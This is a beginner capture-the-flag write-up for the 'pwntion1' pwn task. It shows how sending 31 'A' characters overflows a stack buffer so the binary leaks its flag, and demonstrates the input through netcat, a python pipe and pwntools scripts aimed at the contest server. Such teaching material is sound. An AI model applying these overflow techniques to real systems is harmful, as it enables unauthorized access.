# Writeup for pwntion1

## Task description
**Points: 50**

**Author: maritio_o**

**Difficulty: n00b/easy**

**Category: pwn**

---

_"As there is little foolish wand-waving here, many of you will hardly believe 
this is magic. I don't expect you will really understand the beauty of the 
softly simmering cauldron with its shimmering fumes, the delicate power of 
liquids that creep through the human veins, bewitching the minds, ensnaring 
the senses... I can teach you how to bottle fame, brew glory, even put a stopper
death - if you aren't as big a bunch of dunderheads as I usually have to teach."_
    
—Professor maritio\_o's introduction of the subject

As you've understood from the 
[introduction to **pwn**tions lectures](https://github.com/PewZ/tg19hack/blob/n00b-pwntion1/tutorial/pwntion/01introduction.md), 
we want to teach you the art of stack overflows. Stack overflow is an ancient way 
of making pwntions, and neither wizards or muggles have gotten affected by this 
pwntion in many decades. 

In the classes we tested our pwntions on a house elf vulnerable to this stack
overflow. Can you brew this right, and give it to him? Don't worry, it is not 
deadly.. He will just grow a large nose, and tell us his deepest secrets..

```
nc pwntion1.tghack.no 1061
```

> Tips: 
> 1. The file expects to read a file called `banner.txt`. For the binary to
> work locally, you should make a file with that name and put whatever you 
> would like into it. 
> 2. Read the Introduction to Pwntions tutorial to learn about this type of 
> stack overflow problem.

---

## Writeup

We are presented with two files:
* `pwntion1_public`: binary file
* `pwntion1_public.c`: C language source code 

It is common for easy pwn tasks to be 32 bit binaries, so let's check if this 
is a 32 bit binary by using the terminal command `file`.

```
$ file pwntion1_public
pwntion1_public: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), 
dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, 
BuildID[sha1]=ffb5ada57e2b7fce04380c4f6ff1ba403d79235e, with debug_info, 
not stripped
```

The command _file_ says it is a 32 bit ELF file. In other words, this is a 
32 bit binary. These binaries are less common nowadays, as 64 bit programs has
taken it's place. However, 64 bit binaries are harder to pwn and we focus on 32
bit pwning in order to get a nice introduction to binary exploitation!

All the steps of the exploiting using our knowledge about the stack is 
explained in the tutorial, so we will not cover that in this writeup. 
By reading the tutorial, we know that we need to overwrite the null byte in 
the buffer before the flag on the stack. Therefore we must send 32 bytes as 
input. This writeup will show several ways to do that.

Here is a nice list to follow when pwning:
1. Check the remote connection 
2. Pwn given binary locally on you machine
3. Send the exploit script to remote connection

---

## Check the remote connection
In order to see what is going on, it is useful to check what happens on the 
remote connection using **netcat** as in the task description. Netcat is a way
of connecting to remote servers.

```
$ nc pwntion1.tghack.no 1061
▄▄▌ ▐ ▄▌▄▄▄ .▄▄▌   ▄▄·       • ▌ ▄ ·. ▄▄▄ .    ▄▄▄▄▄                          
██· █▌▐█▀▄.▀·██•  ▐█ ▌▪▪     ·██ ▐███▪▀▄.▀·    •██  ▪                         
██▪▐█▐▐▌▐▀▀▪▄██▪  ██ ▄▄ ▄█▀▄ ▐█ ▌▐▌▐█·▐▀▀▪▄     ▐█.▪ ▄█▀▄                     
▐█▌██▐█▌▐█▄▄▌▐█▌▐▌▐███▌▐█▌.▐▌██ ██▌▐█▌▐█▄▄▌     ▐█▌·▐█▌.▐▌                    
 ▀▀▀▀ ▀▪ ▀▀▀ .▀▀▀ ·▀▀▀  ▀█▄▀▪▀▀  █▪▀▀▀ ▀▀▀      ▀▀▀  ▀█▄▀▪                    
▪   ▐ ▄ ▄▄▄▄▄▄▄▄        ·▄▄▄▄  ▄• ▄▌ ▄▄· ▄▄▄▄▄▪         ▐ ▄     ▄▄▄▄▄         
██ •█▌▐█•██  ▀▄ █·▪     ██▪ ██ █▪██▌▐█ ▌▪•██  ██ ▪     •█▌▐█    •██  ▪        
▐█·▐█▐▐▌ ▐█.▪▐▀▀▄  ▄█▀▄ ▐█· ▐█▌█▌▐█▌██ ▄▄ ▐█.▪▐█· ▄█▀▄ ▐█▐▐▌     ▐█.▪ ▄█▀▄    
▐█▌██▐█▌ ▐█▌·▐█•█▌▐█▌.▐▌██. ██ ▐█▄█▌▐███▌ ▐█▌·▐█▌▐█▌.▐▌██▐█▌     ▐█▌·▐█▌.▐▌   
▀▀▀▀▀ █▪ ▀▀▀ .▀  ▀ ▀█▄▀▪▀▀▀▀▀•  ▀▀▀ ·▀▀▀  ▀▀▀ ▀▀▀ ▀█▄▀▪▀▀ █▪     ▀▀▀  ▀█▄▀▪   
 ▄▄▄·▄▄▌ ▐ ▄▌ ▐ ▄ ▄▄▄▄▄▪         ▐ ▄ .▄▄ ·      ▄▄· ▄▄▌   ▄▄▄· .▄▄ · .▄▄ · ▄▄ 
▐█ ▄███· █▌▐█•█▌▐█•██  ██ ▪     •█▌▐█▐█ ▀.     ▐█ ▌▪██•  ▐█ ▀█ ▐█ ▀. ▐█ ▀. ██▌
 ██▀·██▪▐█▐▐▌▐█▐▐▌ ▐█.▪▐█· ▄█▀▄ ▐█▐▐▌▄▀▀▀█▄    ██ ▄▄██▪  ▄█▀▀█ ▄▀▀▀█▄▄▀▀▀█▄▐█·
▐█▪·•▐█▌██▐█▌██▐█▌ ▐█▌·▐█▌▐█▌.▐▌██▐█▌▐█▄▪▐█    ▐███▌▐█▌▐▌▐█ ▪▐▌▐█▄▪▐█▐█▄▪▐█.▀ 
.▀    ▀▀▀▀ ▀▪▀▀ █▪ ▀▀▀ ▀▀▀ ▀█▄▀▪▀▀ █▪ ▀▀▀▀     ·▀▀▀ .▀▀▀  ▀  ▀  ▀▀▀▀  ▀▀▀▀  ▀


Professor maritio\_o:
"As there is little foolish wand-waving here, many of you will
hardly believe this is magic. I don't expect you will really
understand the beauty of the softly simmering cauldron with
its shimmering fumes, the delicate power of liquids that
creep through the human veins, bewitching the minds, ensnaring
the senses... I can teach you how to bottle fame, brew glory,
and even stopper death - if you aren't as big a bunch of
dunderheads as I usually have to teach."

Student: 
```

When sending input, the input seems to be printed and then the program exits. 
For example, the snippet below shows how the remote server responds when 
sending the input `Hello!`.

```
$ nc pwntion1.tghack.no 1061
▄▄▌ ▐ ▄▌▄▄▄ .▄▄▌   ▄▄·       • ▌ ▄ ·. ▄▄▄ .    ▄▄▄▄▄                          
██· █▌▐█▀▄.▀·██•  ▐█ ▌▪▪     ·██ ▐███▪▀▄.▀·    •██  ▪                         
██▪▐█▐▐▌▐▀▀▪▄██▪  ██ ▄▄ ▄█▀▄ ▐█ ▌▐▌▐█·▐▀▀▪▄     ▐█.▪ ▄█▀▄                     
▐█▌██▐█▌▐█▄▄▌▐█▌▐▌▐███▌▐█▌.▐▌██ ██▌▐█▌▐█▄▄▌     ▐█▌·▐█▌.▐▌                    
 ▀▀▀▀ ▀▪ ▀▀▀ .▀▀▀ ·▀▀▀  ▀█▄▀▪▀▀  █▪▀▀▀ ▀▀▀      ▀▀▀  ▀█▄▀▪                    
▪   ▐ ▄ ▄▄▄▄▄▄▄▄        ·▄▄▄▄  ▄• ▄▌ ▄▄· ▄▄▄▄▄▪         ▐ ▄     ▄▄▄▄▄         
██ •█▌▐█•██  ▀▄ █·▪     ██▪ ██ █▪██▌▐█ ▌▪•██  ██ ▪     •█▌▐█    •██  ▪        
▐█·▐█▐▐▌ ▐█.▪▐▀▀▄  ▄█▀▄ ▐█· ▐█▌█▌▐█▌██ ▄▄ ▐█.▪▐█· ▄█▀▄ ▐█▐▐▌     ▐█.▪ ▄█▀▄    
▐█▌██▐█▌ ▐█▌·▐█•█▌▐█▌.▐▌██. ██ ▐█▄█▌▐███▌ ▐█▌·▐█▌▐█▌.▐▌██▐█▌     ▐█▌·▐█▌.▐▌   
▀▀▀▀▀ █▪ ▀▀▀ .▀  ▀ ▀█▄▀▪▀▀▀▀▀•  ▀▀▀ ·▀▀▀  ▀▀▀ ▀▀▀ ▀█▄▀▪▀▀ █▪     ▀▀▀  ▀█▄▀▪   
 ▄▄▄·▄▄▌ ▐ ▄▌ ▐ ▄ ▄▄▄▄▄▪         ▐ ▄ .▄▄ ·      ▄▄· ▄▄▌   ▄▄▄· .▄▄ · .▄▄ · ▄▄ 
▐█ ▄███· █▌▐█•█▌▐█•██  ██ ▪     •█▌▐█▐█ ▀.     ▐█ ▌▪██•  ▐█ ▀█ ▐█ ▀. ▐█ ▀. ██▌
 ██▀·██▪▐█▐▐▌▐█▐▐▌ ▐█.▪▐█· ▄█▀▄ ▐█▐▐▌▄▀▀▀█▄    ██ ▄▄██▪  ▄█▀▀█ ▄▀▀▀█▄▄▀▀▀█▄▐█·
▐█▪·•▐█▌██▐█▌██▐█▌ ▐█▌·▐█▌▐█▌.▐▌██▐█▌▐█▄▪▐█    ▐███▌▐█▌▐▌▐█ ▪▐▌▐█▄▪▐█▐█▄▪▐█.▀ 
.▀    ▀▀▀▀ ▀▪▀▀ █▪ ▀▀▀ ▀▀▀ ▀█▄▀▪▀▀ █▪ ▀▀▀▀     ·▀▀▀ .▀▀▀  ▀  ▀  ▀▀▀▀  ▀▀▀▀  ▀


Professor maritio\_o:
"As there is little foolish wand-waving here, many of you will
hardly believe this is magic. I don't expect you will really
understand the beauty of the softly simmering cauldron with
its shimmering fumes, the delicate power of liquids that
creep through the human veins, bewitching the minds, ensnaring
the senses... I can teach you how to bottle fame, brew glory,
and even stopper death - if you aren't as big a bunch of
dunderheads as I usually have to teach."

Student: 
Hello!
Hello!
```

Nice! We know how it looks at the remote server, and we are now ready to pwn
the local binary.

## Pwn given binary locally on you machine
We open the terminal and try to pwn the file locally, by running the binary 
file.

```
$ ./pwntion1_public 
fopen(banner.txt): No such file or directory
```

At first, we get an error. This is expected, as we see in the source code and 
the task description hint that this binary expects a file containing the banner 
that the task prints. The file's name should be `banner.txt`. So, in order for
the binary to run locally, we make a file called `banner.txt` in the same 
folder as we run the binary from. The safest way is to go into the folder that
the binary lies in, and make the banner file there. Afterwards, run the file
from that folder. You may for example do it like this:

```
$ echo "My awesome banner" > banner.txt 
$ cat banner.txt 
My awesome banner
```

In this snippet, we use the terminal command `echo` to output the text 
`My awesome banner`, but instead of outputting it into the terminal, we decide
that it should be put into the banner file. To make sure the right
text is inside the file, we use the command `cat`, which output the contents
of text files into the terminal. 

Now, lets try to run the file again!

```
$ ./pwntion1_public
My awesome banner


Professor maritio_o:
"As there is little foolish wand-waving here, many of you will
hardly believe this is magic. I don't expect you will really
understand the beauty of the softly simmering cauldron with
its shimmering fumes, the delicate power of liquids that
creep through the human veins, bewitching the minds, ensnaring
the senses... I can teach you how to bottle fame, brew glory,
and even stopper death - if you aren't as big a bunch of
dunderheads as I usually have to teach."

Student: 
Hello!
Hello!
``` 

Aww yeah! It runs like on the server, so we know it is running as supposed to
locally on our machines. This means we are ready to do some pwning! There are 
three ways to solve this that I want to mention here:

1. Sending the input manually
2. Sending the input using a one line python script and redirect
3. Sending the input using a python script

### 1. Sending input manually
As the solution input does not depend on the output of the program, and it does
not seem like a lot of input is needed, we may do this manually. We open the 
terminal, and write 32 A's into the program in order to overwrite the null byte
and make the program believe the flag variable is a part of the buffer holding
the input from the student. 

```
$ ./pwntion1_public 
My awesome banner


Professor maritio_o:
"As there is little foolish wand-waving here, many of you will
hardly believe this is magic. I don't expect you will really
understand the beauty of the softly simmering cauldron with
its shimmering fumes, the delicate power of liquids that
creep through the human veins, bewitching the minds, ensnaring
the senses... I can teach you how to bottle fame, brew glory,
and even stopper death - if you aren't as big a bunch of
dunderheads as I usually have to teach."

Student: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
G19{This is a dummy flag. Real flag on server.}
```

Now, did you notice that the flag is missing one character? That's 
because pressing the `enter` key is the same as sending a new line
to the program. A new line has the size of one byte. Therefore,
to fetch the whole flag, you may simply subtract one byte from the 
input. As one character is one byte, we remove one A. The snippet
below sends one less A than the snippet above, and then we get the 
whole flag!

```
$ ./pwntion1_public 
My awesome banner


Professor maritio_o:
"As there is little foolish wand-waving here, many of you will
hardly believe this is magic. I don't expect you will really
understand the beauty of the softly simmering cauldron with
its shimmering fumes, the delicate power of liquids that
creep through the human veins, bewitching the minds, ensnaring
the senses... I can teach you how to bottle fame, brew glory,
and even stopper death - if you aren't as big a bunch of
dunderheads as I usually have to teach."

Student: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
TG19{This is a dummy flag. Real flag on server.}
```

However, manual work is often tedious. It is also often messy and requires more 
work trying to pwn manually than writing a little script. Therefore, we 
present two other ways of sending the input.

### 2. Sending the input using a one line python script and redirect
We may send the same input to a binary using the pipe symbol, like this:

```
$ python -c 'print("A" * 31)' | ./pwntion1_public
My awesome banner


Professor maritio_o:
"As there is little foolish wand-waving here, many of you will
hardly believe this is magic. I don't expect you will really
understand the beauty of the softly simmering cauldron with
its shimmering fumes, the delicate power of liquids that
creep through the human veins, bewitching the minds, ensnaring
the senses... I can teach you how to bottle fame, brew glory,
and even stopper death - if you aren't as big a bunch of
dunderheads as I usually have to teach."

Student: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
TG19{This is a dummy flag. Real flag on server.}
```

### 3. Sending the input using a python script
Using **pwn-tools** as described in the Python tutorial, we may write a simple
script and run it using Python. Here is the script:

```Python
from pwn import *

r = process("./pwntion1_public")

r.recvuntil("Student:\n")
r.sendline("A" * 31)

r.interactive()
```

## Send the exploit script to remote connection
As in the first section, where we checked out what was going on at the remote
server, we use the **netcat** command. This time we add the solve scripts from
the previous sections.

### 1. Manually
Do exactly the same as locally, and get the real flag.

### 2. Redirecting 
Use the same script, but change from binary to netcat.

```
$ python -c 'print("A" * 31)' | nc pwntion1.tghack.no 1061
```

### 3. Python script
It is useful to make a script that may run the input against both the local 
script and on the remote server. The following script does so by setting a 
debug flag to `True` if running locally. Now it is set to `False` in order 
to send to the remote server.

```
from pwn import *

debug = False
if debug == True:
    r = process("./pwntion1_public")
else:
    r = remote("pwntion1.tghack.no", 1061)

r.recvuntil("Student:\n")
r.sendline("A" * 31)

r.interactive()
```

Aww yeah, so many ways to get the flag! :O I prefer and recommend using the 
last two options as they are the easiest to modify and test again.
